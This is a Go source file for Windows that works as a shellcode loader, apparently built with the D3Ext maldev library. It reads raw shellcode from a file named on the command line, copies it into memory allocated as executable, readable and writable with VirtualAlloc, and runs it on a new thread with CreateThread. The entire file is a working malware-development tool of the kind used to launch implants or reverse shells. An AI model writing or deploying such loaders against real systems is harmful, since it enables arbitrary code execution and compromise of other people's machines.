package main

import (
	"flag"
	"fmt"
	"os"
	"unsafe"

	//"github.com/D3Ext/maldev/process"
	"github.com/D3Ext/maldev/shellcode"
	"golang.org/x/sys/windows"
)

var (
	kernel32DLL         = windows.NewLazyDLL("kernel32.dll")
	procVirtualAlloc    = kernel32DLL.NewProc("VirtualAlloc")
	procRtlMoveMemory   = kernel32DLL.NewProc("RtlMoveMemory")
	procCreateThread    = kernel32DLL.NewProc("CreateThread")
	waitForSingleObject = kernel32DLL.NewProc("WaitForSingleObject")
)

func loadShellcode(shellcode []byte) {
	fmt.Println("FunctionStart")
	addr, _, _ := procVirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		fmt.Println("Coudlnt allocate the memory")
		os.Exit(-1)
	}

	procRtlMoveMemory.Call(
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)))

	threadHandle, _, _ := procCreateThread.Call(
		0,
		0,
		addr,
		0,
		0,
	)
	waitForSingleObject.Call(threadHandle, uintptr(^uint(0)))
}

//This program runs shellcode within itself. Does not inject.

func main() {
	total_args := len(os.Args[1:])
	if total_args != 2 {
		fmt.Println("Usage: CreateThread.exe -s <shellcode.bin>")
		os.Exit(0)
	}
	var path2shellcode string
	flag.StringVar(&path2shellcode, "s", "EMPTY", "Shellcode2Inject")
	flag.Parse()
	if path2shellcode == "EMPTY" {
		os.Exit(0)
	}

	fmt.Println("Loader via CreateProcess")
	fmt.Println("Grabbing Shellcode from file: " + path2shellcode)
	shellcode, err := shellcode.GetShellcodeFromFile(path2shellcode)
	if err != nil {
		fmt.Println("Could not grab shellcode from the file")
		os.Exit(-1)
	}
	loadShellcode(shellcode)
	fmt.Printf("Succesfully Executed !")
}
